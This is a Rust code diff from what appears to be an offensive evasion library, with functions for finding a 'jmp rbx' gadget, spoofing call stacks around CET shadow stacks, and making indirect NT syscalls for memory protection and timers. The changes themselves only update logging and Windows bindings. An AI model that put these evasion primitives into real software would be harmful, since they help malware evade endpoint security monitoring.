@@ -4316,9 +4440,9 @@ pub fn find_jmp_rbx_gadget() -> usize {
     if base == 0 {
         return 0;
     }
-    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
+    let dos_header = base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
     let nt_headers = (base + unsafe { *dos_header }.e_lfanew as usize)
-        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
+        as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
     let size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage } as usize;
     let code = unsafe { std::slice::from_raw_parts(base as *const u8, size) };
 
@@ -4391,7 +4515,7 @@ pub unsafe fn spoof_call(
     #[cfg(all(feature = "cet-bypass", target_arch = "x86_64"))]
     {
         if crate::cet_bypass::is_cet_active() {
-            log::warn!(
+            tracing::warn!(
                 "spoof_call: CET shadow stacks are active — return-address manipulation \
                  may trigger a #CP exception.  Callers should use clean_call! macro \
                  which routes through CET-compatible paths."
@@ -4861,7 +4985,7 @@ pub unsafe fn syscall_NtProtectVirtualMemory(
             ],
         ),
         Err(e) => {
-            log::warn!("syscall_NtProtectVirtualMemory: could not get SSN: {}", e);
+            tracing::warn!("syscall_NtProtectVirtualMemory: could not get SSN: {}", e);
             -1
         }
     }
@@ -4884,7 +5008,7 @@ pub unsafe fn syscall_NtCreateTimer(
             &[timer_handle, desired_access, object_attributes, timer_type],
         ),
         Err(e) => {
-            log::warn!("syscall_NtCreateTimer: could not get SSN: {}", e);
+            tracing::warn!("syscall_NtCreateTimer: could not get SSN: {}", e);
             -1
         }
     }
@@ -4918,7 +5042,7 @@ pub unsafe fn syscall_NtSetTimer(
             ],
         ),
         Err(e) => {
-            log::warn!("syscall_NtSetTimer: could not get SSN: {}", e);
+            tracing::warn!("syscall_NtSetTimer: could not get SSN: {}", e);
             -1
         }
     }
@@ -4939,7 +5063,7 @@ pub unsafe fn syscall_NtWaitForSingleObject(
             &[handle, alertable, timeout],
         ),
         Err(e) => {
-            log::warn!("syscall_NtWaitForSingleObject: could not get SSN: {}", e);
+            tracing::warn!("syscall_NtWaitForSingleObject: could not get SSN: {}", e);
             -1
         }
     }
@@ -4952,7 +5076,7 @@ pub unsafe fn syscall_NtClose(handle: u64) -> i32 {
     match get_syscall_id("NtClose") {
         Ok(target) => do_syscall(target.ssn, target.gadget_addr, &[handle]),
         Err(e) => {
-            log::warn!("syscall_NtClose: could not get SSN: {}", e);
+            tracing::warn!("syscall_NtClose: could not get SSN: {}", e);
             -1
         }
     }
